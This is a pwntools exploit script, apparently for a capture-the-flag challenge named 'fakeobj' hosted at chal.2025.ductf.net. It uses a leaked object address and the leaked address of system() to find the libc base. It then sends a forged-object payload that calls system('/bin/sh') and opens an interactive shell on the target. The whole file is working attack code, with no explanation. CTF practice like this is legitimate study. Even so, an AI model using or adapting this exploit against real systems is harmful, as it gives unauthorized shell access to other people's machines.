from pwn import *
libc = ELF("./libc.so.6")
context.terminal = ['alacritty','-e','bash','-c']
def conn():
    if args.LOCAL:
        r = process(["python","fakeobj.py"])
    else:
        r = remote("chal.2025.ductf.net",30001)
        #r = remote("localhost",1337)
        context.noptrace=True
    return r
import subprocess

r= conn()
obj_addr = int(r.recvline().strip().split(b'=')[-1],16)
log.info(f'obj addr : {hex(obj_addr)}')
system_addr = int(r.recvline().strip().split(b'=')[-1],16)
log.info(f'system addr : {hex(system_addr)}')
libc.address = system_addr - libc.sym['system']
log.info(f'libc addr : {hex(libc.address)}')
binsh = next(libc.search(b'/bin/sh'))
log.info(f'binsh addr : {hex(binsh)}')

pl = b""
pl+= b'\x2e'+b'bin/sh\x00'
pl+=p64(obj_addr-0x48)
pl+=p64(system_addr)
pl+=b'b'*(64-len(pl))
pl+=p64(system_addr)
pause()
r.sendlineafter(b'fakeobj:',pl.hex().encode())
r.interactive()
